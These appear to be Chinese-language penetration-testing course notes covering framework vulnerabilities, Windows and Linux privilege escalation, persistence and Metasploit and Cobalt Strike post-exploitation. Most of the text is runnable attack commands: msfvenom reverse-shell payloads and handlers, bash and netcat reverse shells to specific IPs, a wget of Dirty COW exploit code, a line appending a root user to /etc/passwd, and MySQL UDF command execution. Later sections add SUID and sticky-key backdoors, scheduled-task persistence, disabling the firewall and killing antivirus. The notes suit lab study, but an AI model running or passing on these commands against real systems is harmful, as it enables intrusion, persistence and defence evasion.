Struts2是一款基于Java开发的框架,web路径下会出现两种特殊的文件格式,即*.action文件与*.jsp文件;现阶段已知的S2poc大多数都是远程命令执行漏洞,主要出现位置有:url中,报文内容中,content-type中;
# thinkPHP框架
thinkphp是一个国内轻量级的开发框架，采用php+apache，在更新迭代中，thinkphp也经常爆出各种漏洞，thinkphp一般有thinkphp2、thinkphp3、thinkphp5、thinkphp6版本，前两个版本已经停止更新，主要介绍下thinkphp5的漏洞
# shiro框架（set-Cookie：rememberme）工具：shiroscan
1、550 721(要登陆)
Shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值–>Base64解码–>AES解密–>反序列化.然而AES的密钥是硬编码的, 密钥泄漏的根本原因是开发人员在开发过程中部分代码直接使用了网上的一些开源的项目代码，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
Apache Shiro框架提供了记住我的功能（RemeberMe），⽤户登录成功后会⽣成经过加密并编码的cookie。
//cookie的key为RemeberMe，cookie的值是经过对相关信息进⾏序列化，然后使⽤aes加密，最后在使⽤base64编码处理形成的。
# openresty（通过Lua扩展Nginx实现的可伸缩的Web平台）
# Laravel
# fastjson<1.2.24反序列化
fastjson.jar是阿里开发的一款专门用于Java开发的包，可以方便的实现json对象与JavaBean对象的转换，实现JavaBean对象与json字符串的转换，实现json对象与json字符串的转换。fastjson 的 pom依赖！
1、特征
	content-length
	@type
~~~

OA

~~~shell
1、泛微weaver
2、织信informat
3、致远互联
4、蓝凌landray
5、华天动力
# Xray、goby
# 主动扫描、被动扫描(点击页面访问才能监听到在做什么，和burp联用)
1、主动扫描： 输入某个URL，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞
2、被动扫描： 在进行手动测试的过程中，代理将流量转发给漏洞扫描器，然后再进行漏洞检测
~~~

## CMS漏洞

```shell
# Wordpress：
	wpscan --url "http://192.168.15.176/wordpress" --enumerate u（枚举用户）
	wpscan --url "【目标系统URL】"  --wordlist 【密码字典文件】 --username 【用户名】
# 常见的CMS系统有wordpress、drupal、joomla、xoops等
```

## 其它漏洞

~~~shell
MS17_010:永恒之蓝
	139端口：NetBIOS服务
	445端口：SMB服务
	SMB(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将DOS操作系统中的本地文件接口“中断13”改造为网络文件系统。
~~~





# 十三、提权

## 一、windows 提权

### 1、溢出提权

溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名：缓冲区溢出漏洞。因为它是在程序执行的时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。

~~~shell
1、win2003提权漏洞：pr.exe
2、自己提权：getsystem（admin-->system）
AT、SC、PS提权
#(1)手动
好用的网站：https://i.hacking8.com/tiquan（利用杀毒软件或者补丁信息）
(2)软件（Cobalt strike）
	1、先生成木马
	2、用中国蚁剑把木马上传，执行exe
# msfvenm -p
一、用kali得到蚁剑权限
1、kali反弹到蚁剑：msfvenom -p windows/materpreter/reverse_tcp LHOST=[kaliIP] LPORT=7755 -f exe > 20_7755.exe
2、kali上监听：kali：mdf6->use exploit/multi/handler 
	set payload windows
	set payload windows/meterpreter/reverse_tcp
	options
	set lhost [kaliIP]
	set lport 7755(木马端口)
	run -j(放在后台)
// 如果要返回查看，用sessions命令
 3、windows上运行
 4、返回查看：session-->getuid
 5、backgroud（放在后台）
二、提权
1、kali： use post/windows/gather/enum_patches（找出系统补丁）
	options
	set session n
	run(发现补丁)
2、kali： use post/multi/recon/local_exploit_suggester(识别系统中可能被利用的漏洞)
	options
	set session n
	run(看那些可以提权)
3、利用:kali:use 复制绿色的exploit
	options
	set lport 5555
	run
~~~

Cobalt Strike提权：

~~~shell
# CS（需要服务端和客户端）服务端再linux上
一、连接
1、复制文件夹到kali上
2、kali：启动文件夹下的teamsever -->先改变文件权限-->./teamserver 172.168.20.84 admin123（密码）
3、客户端直接连接：
主机写kali 
端口：50050 
密码：admin123
二、提权（win）
1、CS菜单-->监听器
2、http地址：kali/监听端口9999/
3、有效载荷-->windows可执行程序（相当于反弹连接的木马）
4、中国蚁剑上传木马
5、设置回连间隔
6、用插件进行提权：LSTAR-->权限提升-->Getsystem
# 本地提权
1、远程桌面（如果只用命令行，可能因为弹出的新的窗口导致无法使用）
#london 1.0
# beacon命令：shell whoami
# argue 进程参数欺骗
argue 进程参数欺骗
argue [command] [fake arguments]

链接：https://wbglil.gitbook.io/cobalt-strike/cobalt-strikemo-kuai-jie-shao
~~~



### 2、数据库提权（UDF、MOF）

~~~shell
mysql root/root
#前提：需要数据库密码（sql注入获取）
可以用蚁剑等连接数据库
开启外联：grant all privilienge
大马工具
# 一、UDF提权（使用者自己添加的mysql函数就称为UDF，user defined function）
原理：通过添加新函数，执行系统命令，引入udf.dll，引入
1、手动
	mysql权限：
	secure-file-priv=“”
	大于5.1版本：udf提权时需要将udf.dll导出到mysql安装目录\lib\plugin\目录下
过程：	
	(1)sqlmap生成dll
			到cloak.py路径下执行命令
			（a）python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_()
			【or D:\ALLin\zhuomian\攻防基础\ONE-FOX集成工具箱\ONE-FOX集成工具箱_V3.0魔改版_by狐狸\gui_scan\sqlmap\extra\cloak】
			（b）cloka.py 文件路径 : /usr/share/sqlmap/extra/cloak
	大于5.1版本：udf提权时需要将udf.dll导出到mysql安装目录\lib\plugin\目录下
	(2)导入文件xxx.dll
	(3)导入abc.dll创建sys_eval()函数
	create function sys_eval returns string soname 'abc.dll'
	(4)使用sys_eval()执行命令
	select sys_eval('net user')
or	
  	(1)使用MSF模块
	  exploit/multi/mysql/mysql_udf_payload
	  (2)再使用工具连接数据库，执行create function sys_eval returns string soname "WGqASYxX.dll";
	  select sys_eval("whoami");
// 做完之后要删除语句、函数，重启服务才能再提权
2、MDUT工具
（1）右键新增-->添加
报错就去github里面下载
# 二、MOF提权（managed object format）
利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。
失败原因：关键目录写不进去，需要等待被动去执行。
1、利用启动项提权（一启动就会执行文件）
search mysql_start_up
2、工具：msf模块
监听：use exploit/multi/handler
# 三、启动项提权（一启动就会执行文件）
1、工具：msf模块
search mysql_start_up
2、sql_server提权（使用：xp_cmdshell，sq_oacreate提取）
# Sql server 提权 sa/123456
	提权使用的函数：xp_cmdshell()
# 链接：https://blog.csdn.net/weixin_40412037/article/details/112858836


##### 补充语句 #####
删除函数：
	delete from mysql.func where name='sys_eval'
开启外连：
	GRANT ALL PRIVILEGES ON *.* TO 'root' @'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
	GRANT OPTION;

~~~



### 3、令牌窃取

令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是
属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。

类型：

* 授权令牌：交互式会话登录
* 模拟令牌：非交互式登录

管理员-->system

~~~shell
# 窃取令牌
1、msf模块：
metapreter:getuid
					use incognito（盗窃目标主机的令牌或是假冒用户）
					list_tokens -u（查看令牌）
					impersonate_token "NT AUTHORITY\SYSTEM"
2、工具：mutiple database Utilization Tools
# 烂土豆提权：本地提权
烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户。
借助提权漏洞(MS16-075)去获取令牌。
1、链接：https://hackergu.com/powerup-stealtoken-rottenpotato/
2、上传烂土豆文件：uploading ： /home/potato.exe -> C://aa//\potato.exe
execute -cH -f 
systeminfo
2017-7269

~~~

### 4、Bypass UAC绕过（UAC安全机制）

操作系统默认情况下是启用UAC，当用户运行软件就会触发UAC规则。执行的时候就需要权限，否则是不会运行的。

msf：use exploit/windows/local/bypassuac

链接：https://www.cnblogs.com/-mo-/p/12088056.html

~~~shell
# 其它提权方式
1、psexec提权：windows的内核的套件（本地提权）
PsExec属于SysInternalSuite （一个windows的内核的套件），是其中一个工具
psexec 这个工具可以以System账号执行一个程序
迁移命令：meterpreter：migrate 6432
# 第三方软件提权
~~~

## 二、Linux

### 1、收集一些系统信息

~~~shell
# 信息收集
链接：https://www.cnblogs.com/yuguangyuan/p/7895292.html
1、操作系统是什么版本？
	cat /etc/issue
	cat /etc/*-release
	cat /etc/lsb-release
	cat /etc/redhat-release
2、内核版本
	cat /proc/version
	uname -a
	uname -mrs
	rpm -q kernel
	dmesg | grep Linux
	ls /boot | grep vmlinuz
# 使用脚本工具
一、信息收集
	1、下载软件：get http://172.157.20.109:8080/LinEnum.sh
	2、修改权限：chmod +x LinEnum.sh
	3、运行：./LinEnum.sh | more 
链接：https://github.com/rebootuser/LinEnum
二、提权
	1、找到漏洞文件并下载：linux_1.sh
	2、下载
链接：
https://github.com/mzet-/linux-exploit-suggester
https://github.com/jondonas/linux-exploit-suggester-2
~~~

### 2、本地内核提权

~~~shell
# 本地内核提权
一、Bizzar靶场
1、找靶场
	1）找同网段：arp-scan -l | grep P
	2）ssh bucciarati@
	3）进入看权限：id--> uname -d（看内核版本的漏洞）
2、在自己的kali里面寻找内核版本的漏洞
	1）kali自带：searchsploit 
	2）查内核：searchsploit Linux 4.10.0-19（找到45010）
	3）searchsploit -x linux/local/45010.c
	4）URL:https://www.exploit-db.com/exploits/45010(可以搜索)
	   Path：/usr/share/exploitdb/exploits/linux/local/45010.c
	5）gcc：gcc 45010.c -o 45010
3、找到漏洞下载到靶机里面并运行
	wget http://IP/45010.c  -O /temp
	./45010
###练习
练习：http://172.168.20.177/
    登陆后台：nick/bulldog
    再反弹shell: echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" | bash
    提权
https://github.com/AdminTest0/SharpWxDump
### 全部漏洞练习的靶场：
portswigger.net/web-security/all-labs
~~~

ubuntu没有网卡解决方案：

~~~shell
1、首先确保网卡设备名称能看到，看不到，以下步骤无意义
sudo lshw -c network
2、命令行执行以下命令
sudo service NetworkManager stop
sudo rm  /var/lib/NetworkManager/NetworkManager.state
sudo gedit /etc/NetworkManager/NetworkManager.conf 
这一步将打开一个文件，把里面的managed=false改为managed=true 再保存。
sudo service NetworkManager start或者reboot
3、若成功则右上角已经能看到本地网络标志；
~~~



### 3、脏牛提权（CVE-2016-5195）

影响范围 kernel>=2.6.22 并且Android也受到影响 <2016-10-18

~~~shell
# 脏牛
	Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。
# 原理
	该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。
1、先找漏洞 40847
	https://www.exploit-db.com/exploits/40847
2、g++ 编译
	g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
3、运行：./dcow -s

~~~



### 4、/etc/passwd提权

~~~shell
# 前提：
如果passwd可写，则可以改变
用户名；加密密码；用户 ID (或 UID)；组 ID (或 GUID)；用户名；用户家目录；登录 Shell
# 使用perl语言生成带有盐值的密码
1、生成密码：perl -le 'print crypt("abc","123")'
				-->12BWKETBcM70Q
2、echo "aaa:12Qm6c8LFmbDA:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd
3、切换用户访问：su aaa

~~~



### 5、定时任务提权

~~~shell
定时任务提权
# 开机自启动
1、查看计划任务：cat /etc/crontab
2、查看定时任务文件：cat /var/spool/cron/root
3、查看定时任务日志：tail -f/var/log/syslog
	如果有定时任务九八需要执行的脚本命令添加进去（反弹shell）
	bash -i >& /dev/tcp/192.168.43.117/555 0>&1
	（kali监听： nc -lvp 555）
# 找计划任务
	ps -aux | grep root
	history
	ls -a
# 靶场提权过程	
1、看id、内核
2、ll /etc/passwd
3、history
4、ps -aux | grep root
5、ls -a
6、ll /home/mistic/logrot.sh
7、vi logrot.sh --> bash -i >& /dev/tcp/172.168.20.219/8888 0>&1(反弹shell)

# 练习
3.计划任务提权
172.168.20.209
mistic/testP@$$swordmistic
ssh登陆
ssh mistic@172.168.20.209
~~~



### 6、suid权限

如果拥有 suid 权限（root）的某文件提供了文件修改、执行系统命令的功能，那就能被攻击者恶意利用来提升系统权限 —— 这就是 SUID 提权的原理。

~~~shell
# find、vim、Bash、Less、more、nano、cp等
# 手动
# 一、以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;
二、添加suid权限
	查看权限：whereis find
	添加权限：chmod u+s /usr/bin/find
	查看权限：发现有了suid权限
	取消suid权限：chmod 755 /usr/bin/find
提权：
	find / -perm -g=s -type f 2>/dev/null
	find . -exec /bin/sh -p \; -quit
#####
sudo -l（需要已经登录的用户的密码）
sudo su
~~~



### 7、sudo提权

Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。

~~~shell
#列出目前用户可执行与无法执行的指令
sudo -l（需要已经登录的用户的密码）
sudo su
# 以下版本存在安全隐患：（sudo --version）
sudo 1.8.2 -- 1.8.31p2
sudo 1.9.0 -- 1.9.5.5p1
# 漏洞探测
sudoedit -s /(如果返回的是usage就是不存在影响的，如果是sudoedit则可能存在安全风险)
#复现：POC地址：https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz
docker imagines（所有镜像）
~~~

### 8、环境变量提权

~~~shell
#root用户下
1、新建一段c代码：demo.c
	#include<unistd.h>
	void main(){
	setuid(0);
	setgid(0);
	system("ps");
	}
2、编译
3、gcc demo.c -o abc
4、复制到：/home目录下
5、添加权限：chmod u+s abc
查看哪些具有suid权限：find / -perm -u=s -type f 2>/dev/null
#使用cp命令提权
1、复制sh文件夹，命名为ps：cp /bin/sh /tmp/ps
	将原本就存在的sh文件复制到/tmp下命名为ps,所以在/tmp下，./ps就可以执行sh，但ps的结果还是正常查看进程
2、配置环境变量：export PATH=/tmp:$PATH
	这时候执行ps就是执行sh,因为环境变量加入了/tmp下
3、./abc
4、id
提权成功

#.sudo 提权：
	docker pull chenaotian/cve-2021-3156
	docker run -it chenaotian/cve-2021-3156 /bin/bash
~~~



### 综合作业：ssh爆破

~~~shell
nmap -p- IP
# 综合作业：扫目录、端口
1、mysql 、mysql慢日志
	select '1111' into outfile '/var/www/aa.php'(写到文件里)
2、phpmyadmin的版本漏洞-->找到漏洞拿到CVE，用msf搜索。
3、tomcat：manager/html 上传文件
	压缩：jar -ovf 1234.war 1234.jsp
	上传：IP/1234/1234.jsp
4、寻找其它的一句话木马：用可以传参数的，输入反弹shell
5、直接用msf扫端口扫出来的服务：search AJP
6、爆破：hydra --h
# 集成工具
1、webpack前端打包：目录扫不出来，用工具/api
2、AccessKey可以管理云服务器
3、社工密码：可以添加名字的密码
4、爆破遇到验证码：用工具
	付费
	github
#suid uid编号

~~~

### 提权作业

~~~shell
# 作业
mestploit_ubuntu
1. tomcat后台拿shell
过程：弱口令：admin/admin--->上传war包(一句话木马)--->反弹shell-->python起一个本地shell-->脏牛提权
反弹shell:  
    nc -e /bin/sh 163.197.210.113 8888
python起一个本地shell:  
    python -c 'import pty;pty.spawn("/bin/bash")'
脏牛：
    wget http://163.197.210.113:8080/dirty.c
    gcc -pthread dirty.c -o dirty -lcrypt
    ./dirty 123456
    su firefart
2. nmap扫描到8009端口-->tomcat AJP 文件包含-->读取/etc/passwd-->ssh爆破弱口令-->(msfadmin/user/service)
弱口令：
    msfadmin/msfadmin
    user/user
    service/service
tomcat AJP文件包含
    使用msf模块
3. 扫描到phpMyAdmin目录-->弱口令(root/root)登陆-->发现版本3.0.1-->存在漏洞CVE-2009-1151-->msf搜索模块利用

~~~



## 三、权限维持

### 1、本地权限维持

windows权限维持：

~~~shell
# 一、生成影子用户（隐藏账号）
# 二、添加计划任务
	schtasks /create /tn abc /sc minute /mo 1 /tr C:\Windows\system32\aaa.exe /ru system /f
# 三、windows服务后门
	1、上传木⻢到：C:\Windows\system32\目录下
	2、创建自启动服务命令：名字为 360，每次重启都会启动 ceshi 服务
# 四、启动项后门
	1、上传木⻢到windows启动项中，每次重启后就会自动运行
	自启动路径：
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
	C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Start
up
# 五、shift粘贴后门
	Shift粘滞键是当用户连按5次shift就会自动弹出的一个程序，其实不光是粘滞键，还有各种辅
助功能，这类辅助功能都拥有一个特点就是当用户未进行登录时也可以触发。所以攻击者很有可能
通过篡改这些辅助功能的指向程序来达到权限维持的目的。
	1、粘贴键程序位置：C:\Windows\system32下sethc.exe
	2、注册表路径：
	3、在目录中新建一个sethc.exe的子项，并添加一个新键debugger, debugger的对应键值为cmd的路径
~~~

Linux权限维持：

~~~shell
# 一、增加超级用户：写入passwd
	（1）密码长度
	（2）密码为x
# 二、suid后门：创建suid权限的文件
	创建suid的文件
	1、命令
		cp /bin/bash /tmp/.root
		chmod 4755 /tmp/.root
		ls -al /tmp/.root
	./.root -p # bash2针对suid有一些防护措施，使用-p参数来获取一个root shell
# 三、后门
	（1）ssh软链接后门
		软连接后⻔的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录。
	（2）ssh密钥免密登录
# 四、crontab计划任务后门
# 五、alias后门

###### 查是否被入侵：
1、查看外联：netstat -anpt
2、查看别名：alias
3、ps -aux | grep python
# 练习：https://taiwanindex.com.tw/
# 验证码爆破插件：
https://github.com/f0ng/captcha-killer-modified
https://github.com/smxiazi/NEW_xp_CAPTCHA/
~~~



### 2、metasploit后渗透

~~~shell
# 一、漏洞利用
1、利用CVE 2019_0708漏洞，攻击成功后要到system权限才行。
2、进程迁移
	getpid-->migrate 2548
	【or run post/windows/manage/migrate】自动迁移进程
# 二、1 后渗透
1、关闭防火墙
 	C:\Windows\system32>netsh advfirewall set allprofiles state off
2、杀死进程(杀毒软件等，防止木马被杀)，这里我随便杀掉一个
	meterpreter > kill 5320
3、制作一个反弹木马
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.47 LPORT=4444 -f exe > /root/cmd.exe
4、上传木马(也可以通过webshell上传木马)
	meterpreter > upload /root/cmd.exe C:\xx.exe
5、新开一个msfconsole：设置监听模块
	msf5 > use exploit/multi/handler
	msf5 exploit(multi/handler) > set payload  	windows/meterpreter/reverse_tcp
	msf5 exploit(multi/handler) > set lhost 172.16.43.47
	msf5 exploit(multi/handler) > set lport 4444
	msf5 exploit(multi/handler) > exploit
6、运行木马：xx.exe
# 二、2 后渗透：留下一个永久后门
1、persistence
2、metsvc
3、getgui
4、nc

######## 密码破解 ########
# 使用工具（github）：
1、hashdump 直接查看密码hash值：
	win hash组成：username:RID:LM-hash:NT-hash
2、使用mimikatz抓取密码
~~~



### 3、CS

~~~shell
# 如何更改DNS解析本地文件
1、win:
	修改本地hosts文件：
	C:\Windows\System32\drivers\etc\hosts
	添加一行：
	172.168.20.37	funbox.fritz.box
2、kali:
  vim /etc/hosts
	添加一行
	172.168.20.37	funbox.fritz.box
# wpscan
# 更新DNS缓存：ipconfig /flashdns
1、上传文件：虽然报错，但是已经存起来了
2、下载源码
# 如果电脑被入侵
	查看用户： cat /etc/passwd
	1、查看隐藏文件：ls -la
	2、查看历史命令：history
	3、查看suid文件：find语句
	4、计划任务：cat crontab
	5、ps aux | grep "root"
	6、查看其他用户的目录：找到可以写的文件
		如果不能用vim、vi，则用echo "123" >> .bash.sh
	7、查看系统日志，帮助排查错误：
			tail -f /var/log/syslog
	8、不能写进去，使用冰蝎和msf联动：use exploit/milti/handler
#### 密码词典
https://github.com/3had0w/Fuzzing-Dicts
~~~

























